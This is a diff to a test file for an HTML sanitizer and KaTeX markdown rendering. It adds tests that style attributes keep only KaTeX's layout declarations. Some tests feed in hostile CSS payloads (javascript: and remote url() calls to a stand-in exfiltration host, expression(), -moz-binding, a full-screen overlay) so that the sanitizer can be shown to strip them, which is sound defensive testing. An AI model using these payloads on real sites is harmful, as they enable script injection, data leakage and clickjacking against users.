@@ -266,6 +266,76 @@ describe('sanitizeHtml', () => {
   })
 })
 
+// `style` is allowed only so KaTeX can position its spans. DOMPurify keeps an
+// allowed `style` attribute verbatim, so the declarations are narrowed by
+// markdown-utils instead - and `sanitizeHtml` is exported, so these hold for
+// every caller, not only for the KaTeX path.
+describe('sanitizeHtml style attribute', () => {
+  it('keeps the length declarations KaTeX emits', () => {
+    const out = sanitizeHtml('<span style="height:0.8141em;top:-3.063em">x</span>')
+    expect(out).toContain('height:0.8141em')
+    expect(out).toContain('top:-3.063em')
+  })
+
+  it('drops a url() payload', () => {
+    const out = sanitizeHtml('<span style="background:url(javascript:alert(1))">x</span>')
+    expect(out).not.toMatch(/javascript:/i)
+    expect(out).not.toContain('url(')
+  })
+
+  it('drops a remote url() that could exfiltrate', () => {
+    const out = sanitizeHtml(
+      '<span style="background:url(https://evil.example/collect?c=1)">x</span>',
+    )
+    expect(out).not.toContain('url(')
+    expect(out).not.toContain('evil.example')
+  })
+
+  it('drops expression() and behavior:', () => {
+    expect(sanitizeHtml('<span style="width:expression(alert(1))">x</span>')).not.toMatch(
+      /expression/i,
+    )
+    expect(sanitizeHtml('<span style="behavior:url(#default#time2)">x</span>')).not.toMatch(
+      /behavior/i,
+    )
+  })
+
+  it('drops -moz-binding', () => {
+    const out = sanitizeHtml(
+      '<span style="color:red;-moz-binding:url(https://evil.example/x.xml#e)">x</span>',
+    )
+    expect(out).not.toMatch(/-moz-binding/i)
+  })
+
+  it('drops a fixed-position overlay', () => {
+    const out = sanitizeHtml(
+      '<span style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">x</span>',
+    )
+    expect(out).not.toMatch(/position\s*:/i)
+    expect(out).not.toMatch(/z-index/i)
+  })
+
+  it('drops an entire non-allowlisted declaration', () => {
+    const out = sanitizeHtml('<span style="color:red;height:1em">x</span>')
+    expect(out).not.toMatch(/color\s*:/i)
+    expect(out).toContain('height:1em')
+  })
+
+  it('cannot be reached by raw HTML in markdown, which is escaped', () => {
+    const out = renderMarkdown('<span style="position:fixed;top:0">x</span>')
+    expect(out).not.toMatch(/<span style/i)
+    expect(out).toContain('&lt;span')
+  })
+
+  it('cannot be reached by KaTeX commands under the default trust setting', () => {
+    for (const command of ['\\htmlStyle{color:red}{x}', '\\style{color:red}{x}', '\\htmlId{e}{x}']) {
+      const out = renderMarkdown(`$${command}$`)
+      expect(out, command).not.toMatch(/style="color/i)
+      expect(out, command).not.toMatch(/id="e"/)
+    }
+  })
+})
+
 // `linkify: true` is user-visible behavior on problem statements, threads and
 // comments. These lock the linkify-it 6 rules that markdown-it 15 enabled:
 // fuzzy links off, no userinfo scanning, and Unicode punctuation ending a link.
@@ -312,13 +382,15 @@ describe('linkify', () => {
 
 describe('katex', () => {
   it('emits the KaTeX 0.18 class names the design-system stylesheet targets', () => {
-    // KaTeX 0.18 renamed 16 internal classes (`.base` -> `.katex-base`,
-    // `.strut` -> `.katex-strut`, ...). If the renderer and
-    // packages/design-system's katex CSS drift apart, formula layout silently
-    // collapses; this pins both sides to the same major.
+    // KaTeX 0.18 renamed its internal classes without keeping aliases:
+    // `.base` -> `.katex-base`, `.strut` -> `.katex-strut`, `.sizing` ->
+    // `.katex-sizing` (121 rules). A 0.18 renderer against the 0.17 stylesheet
+    // matches none of them and formula layout collapses with no error, so this
+    // pins both sides to the same major.
     const html = renderMarkdown('$x^2$')
     expect(html).toContain('katex-base')
     expect(html).toContain('katex-strut')
+    expect(html).toContain('katex-sizing')
   })
 
   it('renders display math with the display wrapper', () => {
@@ -333,6 +405,30 @@ describe('katex', () => {
     renderMarkdown('$\\gdef\\leakedmacro{42}$')
     const next = renderMarkdown('$\\leakedmacro$')
     expect(next).not.toContain('42')
+  })
+
+  it('keeps the inline geometry KaTeX puts on its spans', () => {
+    // KaTeX writes every glyph height, depth and offset as an inline style.
+    // Dropping the attribute collapses a formula onto one line: numerators,
+    // superscripts and matrix rows lose their vertical position while the rest
+    // of the page still renders, so the math is silently wrong rather than
+    // visibly missing.
+    const html = renderMarkdown('$\\frac{a}{b}$')
+    expect(html).toMatch(/style="[^"]*height:/)
+  })
+
+  it('keeps the preserveAspectRatio that draws radicals and stretchy glyphs', () => {
+    // These draw as an SVG with a 400000-unit-wide viewBox that has to be
+    // sliced to a ~1em box. Without the attribute the SVG falls back to `meet`
+    // and scales the whole box down to nothing, so the glyph disappears.
+    // Big delimiters also use SVG but set width/height styles instead, so they
+    // are not part of this contract. The value differs per glyph
+    // (`xMinYMin slice`, `xMaxYMin slice`, `xMidYMin slice`, `none`), so only
+    // presence is asserted; the editor strips the attribute entirely.
+    for (const tex of ['\\sqrt{2}', '\\sqrt[3]{x}', '\\xrightarrow{a}', '\\overbrace{a+b}', '\\widehat{abc}']) {
+      expect(renderMarkdown(`$${tex}$`), tex).toMatch(/preserveAspectRatio="/)
+    }
+    expect(renderMarkdown('$\\sqrt{2}$')).toContain('preserveAspectRatio="xMinYMin slice"')
   })
 
   it('sanitizes hostile HTML next to math', () => {
